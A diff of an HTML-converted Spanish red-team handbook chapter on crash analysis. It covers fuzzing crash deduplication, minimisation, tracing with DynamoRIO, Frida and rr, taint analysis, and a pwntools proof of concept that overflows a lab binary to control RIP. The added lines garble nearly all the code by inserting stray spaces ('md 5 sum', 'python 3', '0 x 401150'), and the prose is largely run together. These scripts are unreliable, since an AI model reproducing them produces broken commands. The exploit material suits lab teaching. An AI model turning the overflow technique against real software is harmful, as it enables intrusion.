 <h1>Generar mapa de cobertura</h1>
 <p>$AFL_PATH/afl-showmap -q -o /tmp/cov_map -- ./target_afl < "$crash" 2>/dev/null</p>
 <h1>Hash del mapa de cobertura</h1>
-<p>hash=$(md5sum /tmp/cov_map | cut -d' ' -f1)</p>
+<p>hash=$(md 5 sum /tmp/cov_map | cut -d' ' -f 1)</p>
 <p>if [[ -z "${seen_coverage[$hash]}" ]]; then</p>
 <p>seen_coverage[$hash]=1</p>
 <p>cp "$crash" "$DEDUPED_DIR/"</p>
 <p>done</p>
-<p>Método3: CASR Clustering</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>Método 3: CASR Clustering</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <h1>CASR hace clustering inteligente considerando:</h1>
 <h1>- Stack trace similarity</h1>
 <h1>- Crash type</h1>
@@ -1155,11 +1155,11 @@
 <h1>Generar reportes para todos los crashes</h1>
 <p>for crash in crashes/*; do</p>
 <p>name=$(basename "$crash")</p>
-<p>casr-san -o "casrep_all/${name}.casrep" -- ./vuln_asan < "$crash" 2>/dev/null || true</p>
+<p>casr-san -o "casrep_all/${name}. casrep" -- ./vuln_asan < "$crash" 2>/dev/null || true</p>
 <p>done</p>
 <h1>Clustering</h1>
 <p>casr-cluster -c casrep_all/ deduped_casr/</p>
-<h1>Resultado: Un directorio por cluster (cl1, cl2, cl3, ...)</h1>
+<h1>Resultado: Un directorio por cluster (cl 1, cl 2, cl 3, ...)</h1>
 <h1>Cada cluster representa un bug único probable</h1>
 <ol>
   <li>4.5. 4. 4.5 Detección de Timeouts y Hangs</li>
@@ -1169,10 +1169,10 @@
 <h1>detect_hangs. sh</h1>
 <p>TIMEOUT=5 # segundos</p>
 <p>for crash in crashes/*; do</p>
-<p>start_time=$(date +%s.%N)</p>
+<p>start_time=$(date +% s.% N)</p>
 <p>timeout $TIMEOUT ./target < "$crash" 2>/dev/null</p>
 <p>exit_code=$?</p>
-<p>end_time=$(date +%s.%N)</p>
+<p>end_time=$(date +% s.% N)</p>
 <p>duration=$(echo "$end_time - $start_time" | bc)</p>
 <p>if [ $exit_code -eq 124 ]; then</p>
 <p>echo "HANG: $(basename $crash) (timeout after ${TIMEOUT}s)"</p>
@@ -1183,8 +1183,8 @@
 <ol>
   <li>4.6. 4. 4.6 Minimización de Crashes</li>
 </ol>
-<p>Laminimizaciónreduceuncrashinputalosbytesesenciales,facilitandoanálisisdecausaraíz.</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>Laminimizaciónreduceuncrashinputalosbytesesenciales, facilitandoanálisisdecausaraíz.</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>AFL-tmin (para targetscon archivo de entrada):</p>
 <h1>Uso básico de afl-tmin</h1>
 <p>afl-tmin -i crash_input -o minimized_crash -- ./target @@</p>
@@ -1195,59 +1195,59 @@
 <h1>-m megs : Límite de memoria</h1>
 <h1>-e : Edge coverage mode (más preciso)</h1>
 <p>Minimizador Python (para targets con argumentos CLI):</p>
-<p>#!/usr/bin/env python3</p>
+<p>#!/usr/bin/env python 3</p>
 <h1>minimize_crash. py - Minimizador por búsqueda binaria</h1>
 <p>import subprocess</p>
 <p>import sys</p>
 <p>import os</p>
-<p>def crashes_with(data, target, test_case):</p>
+<p>def crashes_with (data, target, test_case):</p>
 <p>"""Ejecuta target y verifica si crashea"""</p>
 <p>try:</p>
-<p>result = subprocess. run(</p>
+<p>result = subprocess. run (</p>
 <p>[target, test_case, data],</p>
 <p>timeout=2,</p>
 <p>capture_output=True</p>
 <h1>SIGSEGV = -11, SIGABRT = -6</h1>
 <p>return result. returncode < 0 or result. returncode == 1</p>
-<p>except subprocess. TimeoutExpired:</p>
+<p>except subprocess. Timeout Expired:</p>
 <p>return False</p>
-<p>def minimize(data, target, test_case):</p>
+<p>def minimize (data, target, test_case):</p>
 <p>"""Minimiza data manteniendo el crash"""</p>
 <p>current = data</p>
 <h1>Fase 1: Eliminar chunks grandes</h1>
-<p>chunk_size = len(current) // 2</p>
+<p>chunk_size = len (current) // 2</p>
 <p>while chunk_size >= 1:</p>
 <p>i = 0</p>
-<p>while i < len(current):</p>
-<p>candidate = current[:i] + current[i+chunk_size:]</p>
-<p>if len(candidate) > 0 and crashes_with(candidate, target, test_case):</p>
+<p>while i < len (current):</p>
+<p>candidate = current[: i] + current[i+chunk_size:]</p>
+<p>if len (candidate) > 0 and crashes_with (candidate, target, test_case):</p>
 <p>current = candidate</p>
-<p>print(f"Reduced to {len(current)} bytes (removed chunk at {i})")</p>
+<p>print (f"Reduced to {len (current)} bytes (removed chunk at {i})")</p>
 <p>else:</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>i += 1</p>
 <p>chunk_size //= 2</p>
 <h1>Fase 2: Eliminar bytes individuales</h1>
 <p>i = 0</p>
-<p>while i < len(current):</p>
-<p>candidate = current[:i] + current[i+1:]</p>
-<p>if len(candidate) > 0 and crashes_with(candidate, target, test_case):</p>
+<p>while i < len (current):</p>
+<p>candidate = current[: i] + current[i+1:]</p>
+<p>if len (candidate) > 0 and crashes_with (candidate, target, test_case):</p>
 <p>current = candidate</p>
-<p>print(f"Reduced to {len(current)} bytes")</p>
+<p>print (f"Reduced to {len (current)} bytes")</p>
 <p>else:</p>
 <p>i += 1</p>
 <p>return current</p>
 <p>if __name__ == "__main__":</p>
-<p>if len(sys. argv) < 4:</p>
-<p>print(f"Usage: {sys. argv[0]} <target> <test_case> <initial_payload>")</p>
-<p>sys. exit(1)</p>
+<p>if len (sys. argv) < 4:</p>
+<p>print (f"Usage: {sys. argv[0]} <target> <test_case> <initial_payload>")</p>
+<p>sys. exit (1)</p>
 <p>target = sys. argv[1]</p>
 <p>test_case = sys. argv[2]</p>
 <p>initial = sys. argv[3]</p>
-<p>print(f"Initial size: {len(initial)} bytes")</p>
-<p>minimized = minimize(initial, target, test_case)</p>
-<p>print(f"\nMinimized size: {len(minimized)} bytes")</p>
-<p>print(f"Minimized payload: {repr(minimized)}")</p>
+<p>print (f"Initial size: {len (initial)} bytes")</p>
+<p>minimized = minimize (initial, target, test_case)</p>
+<p>print (f"\n Minimized size: {len (minimized)} bytes")</p>
+<p>print (f"Minimized payload: {repr (minimized)}")</p>
 <p>Minimización de Corpus (afl-cmin):</p>
 <h1>Reducir corpus manteniendo cobertura completa</h1>
 <p>afl-cmin -i corpus_full/ -o corpus_min/ -- ./target @@</p>
@@ -1257,42 +1257,42 @@
   <li>5. 4. 5 Análisis de Alcanzabilidad (Reachability Analysis)</li>
 </ol>
 <p>El análisis de alcanzabilidad determina cómo un atacante puede llegar al código vulnerable desde</p>
-<p>unpuntodeentradaexterno,yquédatoscontrolaenesecamino.</p>
+<p>unpuntodeentradaexterno, yquédatoscontrolaenesecamino.</p>
 <ol>
-  <li>5.1. 4. 5.1 DynamoRIO + drcov</li>
+  <li>5.1. 4. 5.1 Dynamo RIO + drcov</li>
 </ol>
-<p>DynamoRIOesunframeworkdeinstrumentacióndinámicabinaria. drcovgeneracoberturadeblo-</p>
+<p>Dynamo RI Oesunframeworkdeinstrumentacióndinámicabinaria. drcovgeneracoberturadeblo-</p>
 <p>quesbásicos.</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>Instalación:</p>
 <h1>Descargar release</h1>
-<p>wget https://github. com/DynamoRIO/dynamorio/releases/download/release_10. 0.0/DynamoRIO-Linux-10. 0.0. tar. gz</p>
-<p>tar xzf DynamoRIO-Linux-10. 0.0. tar. gz</p>
-<p>export DYNAMORIO_HOME=$(pwd)/DynamoRIO-Linux-10. 0.0</p>
+<p>wget <a href="https://github." target="_blank">https://github.</a> com/Dynamo RIO/dynamorio/releases/download/release_10. 0.0/Dynamo RIO-Linux-10. 0.0. tar. gz</p>
+<p>tar xzf Dynamo RIO-Linux-10. 0.0. tar. gz</p>
+<p>export DYNAMORIO_HOME=$(pwd)/Dynamo RIO-Linux-10. 0.0</p>
 <h1>Agregar al PATH</h1>
-<p>echo "export PATH=\$PATH:$DYNAMORIO_HOME/bin64" >> ~/.bashrc</p>
-<p>source ~/.bashrc</p>
+<p>echo "export PATH=\$PATH:$DYNAMORIO_HOME/bin 64" >> ~/. bashrc</p>
+<p>source ~/. bashrc</p>
 <p>Generación de Cobertura:</p>
 <p>cd ~/crash_analysis_lab</p>
 <h1>Generar cobertura para crash input</h1>
-<p>drrun -t drcov -- ./vuln_no_protect 1 "$(python3 -c 'print(\"A\"*100)')"</p>
-<h1>Salida: drcov. vuln_no_protect.*.log</h1>
+<p>drrun -t drcov -- ./vuln_no_protect 1 "$(python 3 -c 'print (\"A\"*100)')"</p>
+<h1>Salida: drcov. vuln_no_protect.*. log</h1>
 <h1>Formato: Lista de bloques básicos ejecutados</h1>
 <h1>Visualizar en IDA/Ghidra con lighthouse/dragondance</h1>
 <h1>O analizar con herramientas de texto:</h1>
-<p>cat drcov.*.log | grep -E "^module|^BB"</p>
+<p>cat drcov.*. log | grep -E "^module|^BB"</p>
 <ol>
   <li>5.2. 4. 5.2 Intel Processor Trace (PT)</li>
 </ol>
-<p>IntelPTesunacaracterísticadehardwarequegrabaelflujodecontrolconoverheadmínimo(~5%).</p>
+<p>Intel P Tesunacaracterísticadehardwarequegrabaelflujodecontrolconoverheadmínimo(~5%).</p>
 <p>Requisitos:</p>
-<p>ProcesadorIntelconsoportePT(Broadwell+)</p>
-<p>KernelLinuxconCONFIG_INTEL_BTS=y</p>
+<p>Procesador Intelconsoporte PT(Broadwell+)</p>
+<p>Kernel Linuxcon CONFIG_INTEL_BTS=y</p>
 <p>Permisosparaperf</p>
 <h1>Verificar soporte</h1>
 <p>grep -q pt /proc/cpuinfo && echo "PT supported"</p>
 <h1>Capturar trace</h1>
-<p>perf record -e intel_pt//u ./vuln_no_protect 1 "$(python3 -c 'print(\"A\"*100)')"</p>
+<p>perf record -e intel_pt//u ./vuln_no_protect 1 "$(python 3 -c 'print (\"A\"*100)')"</p>
 <h1>Decodificar trace</h1>
 <p>perf script --itrace=b > trace. txt</p>
 <h1>Analizar con perf-read-vdso o herramientas especializadas</h1>
@@ -1301,51 +1301,51 @@
   <li>5.3. 4. 5.3 Frida para Tracing Dinámico</li>
 </ol>
 <p>Fridapermiteinstrumentarprocesosentiemporealsinrecompilación.</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>Instalación:</p>
 <p>pip install frida-tools frida</p>
 <p>Script de Tracing de Funciones:</p>
 <p>// trace_functions. js - Trazar todas las llamadas a funciones del binario</p>
 <p>"use strict";</p>
 <p>// Obtener base del módulo principal</p>
-<p>const mainModule = Process. enumerateModules()[0];</p>
-<p>console. log(`[*] Module: ${mainModule. name} at ${mainModule. base}`);</p>
+<p>const main Module = Process. enumerate Modules ()[0];</p>
+<p>console. log (`[*] Module: ${main Module. name} at ${main Module. base}`);</p>
 <p>// Enumerar exports y hookear</p>
-<p>mainModule. enumerateExports().forEach(exp => {</p>
+<p>main Module. enumerate Exports (). for Each (exp => {</p>
 <p>if (exp. type === 'function') {</p>
-<p>Interceptor. attach(exp. address, {</p>
-<p>onEnter: function(args) {</p>
-<p>console. log(`[CALL] ${exp. name}`);</p>
-<p>onLeave: function(retval) {</p>
-<p>console. log(`[RET] ${exp. name} = ${retval}`);</p>
+<p>Interceptor. attach (exp. address, {</p>
+<p>on Enter: function (args) {</p>
+<p>console. log (`[CALL] ${exp. name}`);</p>
+<p>on Leave: function (retval) {</p>
+<p>console. log (`[RET] ${exp. name} = ${retval}`);</p>
 <p>// Para funciones internas (sin export), usar direcciones</p>
-<p>Interceptor. attach(ptr("0x401150"), {</p>
-<p>onEnter: function(args) {</p>
-<p>console. log(`[*] stack_overflow called with: ${args[0].readCString()}`);</p>
+<p>Interceptor. attach (ptr ("0 x 401150"), {</p>
+<p>on Enter: function (args) {</p>
+<p>console. log (`[*] stack_overflow called with: ${args[0]. read C String ()}`);</p>
 <p>Script de Tracing de Memoria:</p>
 <p>// trace_memory. js - Monitorear accesos a memoria</p>
 <p>"use strict";</p>
 <p>// Hookear malloc para rastrear allocations</p>
-<p>const mallocPtr = Module. findExportByName(null, "malloc");</p>
-<p>const freePtr = Module. findExportByName(null, "free");</p>
-<p>const allocations = new Map();</p>
-<p>Interceptor. attach(mallocPtr, {</p>
-<p>onEnter: function(args) {</p>
-<p>this. size = args[0].toInt32();</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
-<p>onLeave: function(retval) {</p>
-<p>if (!retval. isNull()) {</p>
-<p>allocations. set(retval. toString(), {</p>
+<p>const malloc Ptr = Module. find Export By Name (null, "malloc");</p>
+<p>const free Ptr = Module. find Export By Name (null, "free");</p>
+<p>const allocations = new Map ();</p>
+<p>Interceptor. attach (malloc Ptr, {</p>
+<p>on Enter: function (args) {</p>
+<p>this. size = args[0]. to Int 32();</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
+<p>on Leave: function (retval) {</p>
+<p>if (! retval. is Null ()) {</p>
+<p>allocations. set (retval. to String (), {</p>
 <p>size: this. size,</p>
-<p>backtrace: Thread. backtrace(this. context, Backtracer. ACCURATE)</p>
-<p>.map(DebugSymbol. fromAddress).join('\n')</p>
-<p>console. log(`[MALLOC] ${retval} (${this. size} bytes)`);</p>
-<p>Interceptor. attach(freePtr, {</p>
-<p>onEnter: function(args) {</p>
-<p>const ptr = args[0].toString();</p>
-<p>if (allocations. has(ptr)) {</p>
-<p>console. log(`[FREE] ${ptr}`);</p>
-<p>allocations. delete(ptr);</p>
+<p>backtrace: Thread. backtrace (this. context, Backtracer. ACCURATE)</p>
+<p>. map (Debug Symbol. from Address). join ('\n')</p>
+<p>console. log (`[MALLOC] ${retval} (${this. size} bytes)`);</p>
+<p>Interceptor. attach (free Ptr, {</p>
+<p>on Enter: function (args) {</p>
+<p>const ptr = args[0]. to String ();</p>
+<p>if (allocations. has (ptr)) {</p>
+<p>console. log (`[FREE] ${ptr}`);</p>
+<p>allocations. delete (ptr);</p>
 <p>Ejecución de Scripts Frida:</p>
 <h1>Lanzar proceso con script</h1>
 <p>frida -f ./vuln_no_protect -l trace_functions. js -- 1 "AAAA"</p>
@@ -1356,7 +1356,7 @@
 <ol>
   <li>5.4. 4. 5.4 rr - Record and Replay Debugging</li>
 </ol>
-<p>rrgrabaejecuciónparareplaydeterminístico,esencialparabugsnodeterminísticos.</p>
+<p>rrgrabaejecuciónparareplaydeterminístico, esencialparabugsnodeterminísticos.</p>
 <p>Instalación:</p>
 <h1>Ubuntu/Debian</h1>
 <p>sudo apt install rr</p>
@@ -1365,24 +1365,24 @@
 <h1>Puede requerir deshabilitar address space randomization</h1>
 <p>echo 1 | sudo tee /proc/sys/kernel/perf_event_paranoid</p>
 <p>Workflow de rr:</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>cd ~/crash_analysis_lab</p>
 <h1>1. Grabar ejecución</h1>
-<p>rr record ./vuln_no_protect 1 "$(python3 -c 'print(\"A\"*100)')"</p>
+<p>rr record ./vuln_no_protect 1 "$(python 3 -c 'print (\"A\"*100)')"</p>
 <h1>2. Replay (inicia GDB con capacidad de ir hacia atrás)</h1>
 <p>rr replay</p>
 <h1>En GDB:</h1>
 <p>(rr) continue # Ejecutar hasta crash</p>
 <p>(rr) reverse-continue # Ir hacia atrás hasta breakpoint previo</p>
 <p>(rr) reverse-stepi # Step back una instrucción</p>
-<p>(rr) watch -l *0x7fffffffe000 # Watchpoint</p>
+<p>(rr) watch -l *0 x 7 fffffffe 000 # Watchpoint</p>
 <p>(rr) reverse-continue # Encontrar quién escribió ahí</p>
 <p>(rr) when # Mostrar posición en el trace</p>
 <h1>3. Buscar el momento exacto de corrupción</h1>
-<p>(rr) break *0x4011a3 # Break en función vulnerable</p>
+<p>(rr) break *0 x 4011 a 3 # Break en función vulnerable</p>
 <p>(rr) reverse-continue # Ir al último call de esa función</p>
 <p>Comandos Esenciales de rr:</p>
-<p>ComandoGDB Propósito</p>
+<p>Comando GDB Propósito</p>
 <p>reverse-continue(rc) Continuarhaciaatrás</p>
 <p>reverse-step(rs) Stephaciaatrás</p>
 <p>reverse-stepi(rsi) Stepinstructionhaciaatrás</p>
@@ -1394,34 +1394,34 @@
 <p>Comparación rr vs TTD:</p>
 <p>Aspecto rr(Linux) TTD(Windows)</p>
 <p>Plataforma Linux Windows</p>
-<p>Overheadgrabación ~2-10x ~2-5x</p>
+<p>Overheadgrabación ~2-10 x ~2-5 x</p>
 <p>Tamañotrace Pequeño Grande</p>
-<p>Integración GDB WinDbg</p>
+<p>Integración GDB Win Dbg</p>
 <p>Multithread Serializado Completo</p>
-<p>Costo Gratuito IncluidoconWinDbg</p>
+<p>Costo Gratuito Incluidocon Win Dbg</p>
 <ol>
   <li>5.5. 4. 5.5 Análisis de Taint (Flujo de Datos)</li>
 </ol>
 <p>Elanálisisdetaintrastreacómodatoscontroladosporelatacantefluyenatravésdelprograma.</p>
 <p>Conceptos:</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>┌──────────────────────────────────────────────────────────────┐</p>
 <h2>│ ANÁLISIS DE TAINT │</h2>
 <p>├──────────────────────────────────────────────────────────────┤</p>
 <p>│ FUENTES (Sources): │</p>
-<p>│ • Entrada de red (recv, read socket) │</p>
-<p>│ • Archivos leídos │</p>
-<p>│ • Variables de entorno │</p>
-<p>│ • Argumentos de línea de comandos │</p>
+<p>│  ·  Entrada de red (recv, read socket) │</p>
+<p>│  ·  Archivos leídos │</p>
+<p>│  ·  Variables de entorno │</p>
+<p>│  ·  Argumentos de línea de comandos │</p>
 <p>│ PROPAGACIÓN (Propagation): │</p>
-<p>│ • Copia directa: y = x │</p>
-<p>│ • Operaciones: z = x + y (z tainted si x o y tainted) │</p>
-<p>│ • Llamadas a funciones │</p>
+<p>│  ·  Copia directa: y = x │</p>
+<p>│  ·  Operaciones: z = x + y (z tainted si x o y tainted) │</p>
+<p>│  ·  Llamadas a funciones │</p>
 <p>│ SUMIDEROS (Sinks): │</p>
-<p>│ • Índices de array: arr[tainted_index] │</p>
-<p>│ • Punteros dereferenciados: *tainted_ptr │</p>
-<p>│ • Argumentos de funciones peligrosas (memcpy size) │</p>
-<p>│ • Instruction pointer │</p>
+<p>│  ·  Índices de array: arr[tainted_index] │</p>
+<p>│  ·  Punteros dereferenciados: *tainted_ptr │</p>
+<p>│  ·  Argumentos de funciones peligrosas (memcpy size) │</p>
+<p>│  ·  Instruction pointer │</p>
 <p>└──────────────────────────────────────────────────────────────┘</p>
 <p>Herramientas de Taint Analysis:</p>
 <p>Herramienta Plataforma Tipo</p>
@@ -1441,161 +1441,161 @@
 <p>[Entry Point] main() ￿ ▼ [Parser] parse_request(user_input) ￿ ▼ [Validator] validate_data(parsed)</p>
 <p>// Bypass posible con X ￿ ▼ [Handler] process_data(validated) ￿ ▼ [VULNERABLE] vulnera-</p>
 <p>ble_function(controlled_buffer)</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <h3>3. DATOS CONTROLADOS</h3>
 <p>| Parámetro | Origen | Control |</p>
 <p>|-----------|--------|---------|</p>
 <p>| buffer | argv[2] | Total |</p>
-<p>| size | strlen(argv[2]) | Indirecto |</p>
+<p>| size | strlen (argv[2]) | Indirecto |</p>
 <h3>4. RESTRICCIONES</h3>
 <p>- Input debe ser < 1024 bytes</p>
 <p>- No puede contener NULL bytes (C string)</p>
 <p>- Debe pasar validación de formato</p>
 <h3>5. TRIGGER MÍNIMO</h3>
 <pre><code>
-./target 1 "$(python3 -c 'print(\"A\"*100)')"
+./target 1 "$(python 3 -c 'print (\"A\"*100)')"
 5. 5.7. 6. COBERTURA DE EJECUCIÓN
-Bloquesejecutadoshastacrash:[N]Archivosrelevantes:[source. c:line]
+Bloquesejecutadoshastacrash:[N]Archivosrelevantes:[source. c: line]
 5. 5.8. 7. MITIGACIONES PRESENTES
-□ ASLR:Enabled
-⊠ StackCanary:Disabled
-⊠ NX:Enabled
-⊠ PIE:Disabled
+□ ASLR: Enabled
+⊠ Stack Canary: Disabled
+⊠ NX: Enabled
+⊠ PIE: Disabled
 ---
-## 4. 6 Desarrollo de PoC (Proof of Concept)
+## 4. 6 Desarrollo de Po C (Proof of Concept)
 ### 4. 6.1 Framework pwntools
-pwntools es la herramienta estándar para desarrollo de exploits y PoCs en Python.
+pwntools es la herramienta estándar para desarrollo de exploits y Po Cs en Python.
 **Instalación:**
 </code></pre>
 <p>pip install pwntools</p>
 <h1>Dependencias adicionales útiles</h1>
 <p>pip install capstone keystone-engine ropper</p>
-<p>PoC Básico - Stack Buffer Overflow:</p>
-<p>#!/usr/bin/env python3</p>
-<p>PoC: Stack Buffer Overflow en vulnerable_suite. c (test case 1)</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>Po C Básico - Stack Buffer Overflow:</p>
+<p>#!/usr/bin/env python 3</p>
+<p>Po C: Stack Buffer Overflow en vulnerable_suite. c (test case 1)</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>Demuestra control de RIP a offset 72 bytes.</p>
 <p>from pwn import *</p>
 <p>import os</p>
 <h1>Configuración</h1>
 <p>context. binary = './vuln_no_protect'</p>
 <p>context. log_level = 'info'</p>
-<p>LAB_DIR = os. path. expanduser("~/crash_analysis_lab")</p>
-<p>TARGET = os. path. join(LAB_DIR, "vuln_no_protect")</p>
-<p>def test_crash():</p>
+<p>LAB_DIR = os. path. expanduser ("~/crash_analysis_lab")</p>
+<p>TARGET = os. path. join (LAB_DIR, "vuln_no_protect")</p>
+<p>def test_crash ():</p>
 <p>"""Verifica que el crash ocurre"""</p>
-<p>os. chdir(LAB_DIR)</p>
+<p>os. chdir (LAB_DIR)</p>
 <h1>Buffer de 64 bytes + 8 bytes RBP = 72 bytes hasta RIP</h1>
 <p>offset = 72</p>
-<p>payload = b"A" * offset + b"BBBBBBBB" # RIP = 0x4242424242424242</p>
-<p>log. info(f"Testing with {len(payload)} byte payload")</p>
-<p>log. info(f"Payload: {offset} x 'A' + 'BBBBBBBB'")</p>
-<p>p = process([TARGET, "1", payload])</p>
+<p>payload = b"A" * offset + b"BBBBBBBB" # RIP = 0 x 4242424242424242</p>
+<p>log. info (f"Testing with {len (payload)} byte payload")</p>
+<p>log. info (f"Payload: {offset} x 'A' + 'BBBBBBBB'")</p>
+<p>p = process ([TARGET, "1", payload])</p>
 <h1>Esperar crash</h1>
-<p>p. wait(timeout=5)</p>
+<p>p. wait (timeout=5)</p>
 <p>if p. returncode == -11: # SIGSEGV</p>
-<p>log. success(f"Crash confirmed! (SIGSEGV)")</p>
+<p>log. success (f"Crash confirmed! (SIGSEGV)")</p>
 <p>return True</p>
 <p>elif p. returncode != 0:</p>
-<p>log. success(f"Crash confirmed! (exit code {p. returncode})")</p>
+<p>log. success (f"Crash confirmed! (exit code {p. returncode})")</p>
 <p>return True</p>
 <p>else:</p>
-<p>log. failure("No crash detected")</p>
+<p>log. failure ("No crash detected")</p>
 <p>return False</p>
-<p>def test_rip_control():</p>
+<p>def test_rip_control ():</p>
 <p>"""Verifica control de RIP usando cyclic pattern"""</p>
-<p>os. chdir(LAB_DIR)</p>
+<p>os. chdir (LAB_DIR)</p>
 <h1>Generar patrón de De Bruijn</h1>
-<p>pattern = cyclic(200)</p>
-<p>log. info(f"Testing RIP control with cyclic pattern ({len(pattern)} bytes)")</p>
-<p>p = process([TARGET, "1", pattern])</p>
-<p>p. wait(timeout=5)</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>pattern = cyclic (200)</p>
+<p>log. info (f"Testing RIP control with cyclic pattern ({len (pattern)} bytes)")</p>
+<p>p = process ([TARGET, "1", pattern])</p>
+<p>p. wait (timeout=5)</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <h1>Para verificar el offset exacto, usar GDB:</h1>
 <h1>gdb ./vuln_no_protect</h1>
-<h1>run 1 $(python3 -c "from pwn import *; print(cyclic(200).decode())")</h1>
-<h1>cyclic -l $rip # o cyclic -l 0x6161616c</h1>
-<p>log. info("To find exact offset, run in GDB:")</p>
-<p>log. info(" cyclic -l <rip_value>")</p>
-<p>log. info(f"Expected offset: 72 bytes")</p>
+<h1>run 1 $(python 3 -c "from pwn import *; print (cyclic (200). decode ())")</h1>
+<h1>cyclic -l $rip # o cyclic -l 0 x 6161616 c</h1>
+<p>log. info ("To find exact offset, run in GDB:")</p>
+<p>log. info (" cyclic -l <rip_value>")</p>
+<p>log. info (f"Expected offset: 72 bytes")</p>
 <p>return True</p>
-<p>def test_reliability(attempts=10):</p>
-<p>"""Prueba confiabilidad del PoC"""</p>
-<p>os. chdir(LAB_DIR)</p>
+<p>def test_reliability (attempts=10):</p>
+<p>"""Prueba confiabilidad del Po C"""</p>
+<p>os. chdir (LAB_DIR)</p>
 <p>offset = 72</p>
 <p>payload = b"A" * offset + b"BBBBBBBB"</p>
-<p>log. info(f"Testing reliability ({attempts} attempts)")</p>
+<p>log. info (f"Testing reliability ({attempts} attempts)")</p>
 <p>successes = 0</p>
-<p>for i in range(attempts):</p>
-<p>p = process([TARGET, "1", payload])</p>
-<p>p. wait(timeout=5)</p>
+<p>for i in range (attempts):</p>
+<p>p = process ([TARGET, "1", payload])</p>
+<p>p. wait (timeout=5)</p>
 <p>if p. returncode == -11:</p>
 <p>successes += 1</p>
 <p>rate = (successes / attempts) * 100</p>
-<p>log. info(f"Crash rate: {successes}/{attempts} ({rate:.1f}%)")</p>
+<p>log. info (f"Crash rate: {successes}/{attempts} ({rate:.1 f}%)")</p>
 <p>if rate >= 90:</p>
-<p>log. success("PoC is reliable!")</p>
+<p>log. success ("Po C is reliable!")</p>
 <p>elif rate >= 50:</p>
-<p>log. warning("PoC is semi-reliable")</p>
+<p>log. warning ("Po C is semi-reliable")</p>
 <p>else:</p>
-<p>log. failure("PoC is unreliable")</p>
+<p>log. failure ("Po C is unreliable")</p>
 <p>return rate</p>
 <p>if __name__ == "__main__":</p>
 <p>import sys</p>
-<p>if len(sys. argv) > 1 and sys. argv[1] == "--test":</p>
-<p>test_reliability()</p>
-<p>elif len(sys. argv) > 1 and sys. argv[1] == "--offset":</p>
-<p>test_rip_control()</p>
+<p>if len (sys. argv) > 1 and sys. argv[1] == "--test":</p>
+<p>test_reliability ()</p>
+<p>elif len (sys. argv) > 1 and sys. argv[1] == "--offset":</p>
+<p>test_rip_control ()</p>
 <p>else:</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
-<p>test_crash()</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
+<p>test_crash ()</p>
 <ol>
-  <li>5.9. 4. 6.2 Pipeline Automatizado Crash-to-PoC</li>
+  <li>5.9. 4. 6.2 Pipeline Automatizado Crash-to-Po C</li>
 </ol>
-<p>#!/usr/bin/env python3</p>
-<p>crash_to_poc. py - Pipeline automatizado para generar PoCs desde crashes</p>
-<p>Uso: python3 crash_to_poc. py <target> <test_case> <crash_payload></p>
+<p>#!/usr/bin/env python 3</p>
+<p>crash_to_poc. py - Pipeline automatizado para generar Po Cs desde crashes</p>
+<p>Uso: python 3 crash_to_poc. py <target> <test_case> <crash_payload></p>
 <p>import subprocess</p>
 <p>import sys</p>
 <p>import os</p>
 <p>import re</p>
 <p>from pathlib import Path</p>
-<p>class CrashToPoC:</p>
+<p>class Crash To Po C:</p>
 <p>def __init__(self, target, test_case, payload):</p>
 <p>self. target = target</p>
 <p>self. test_case = test_case</p>
 <p>self. original_payload = payload</p>
 <p>self. minimized_payload = None</p>
 <p>self. crash_info = {}</p>
-<p>def step1_minimize(self):</p>
+<p>def step 1_minimize (self):</p>
 <p>"""Minimizar el crash input"""</p>
-<p>print("[*] Step 1: Minimizing crash input...")</p>
+<p>print ("[*] Step 1: Minimizing crash input...")</p>
 <p>current = self. original_payload</p>
 <h1>Búsqueda binaria para encontrar tamaño mínimo</h1>
-<p>chunk_size = len(current) // 2</p>
+<p>chunk_size = len (current) // 2</p>
 <p>while chunk_size >= 1:</p>
 <p>i = 0</p>
-<p>while i < len(current):</p>
-<p>candidate = current[:i] + current[i+chunk_size:]</p>
-<p>if len(candidate) > 0 and self. _crashes(candidate):</p>
+<p>while i < len (current):</p>
+<p>candidate = current[: i] + current[i+chunk_size:]</p>
+<p>if len (candidate) > 0 and self. _crashes (candidate):</p>
 <p>current = candidate</p>
 <p>else:</p>
 <p>i += 1</p>
 <p>chunk_size //= 2</p>
 <p>self. minimized_payload = current</p>
-<p>reduction = (1 - len(current)/len(self. original_payload)) * 100</p>
-<p>print(f" Reduced: {len(self. original_payload)} -> {len(current)} bytes ({reduction:.1f}%)")</p>
+<p>reduction = (1 - len (current)/len (self. original_payload)) * 100</p>
+<p>print (f" Reduced: {len (self. original_payload)} -> {len (current)} bytes ({reduction:.1 f}%)")</p>
 <p>return current</p>
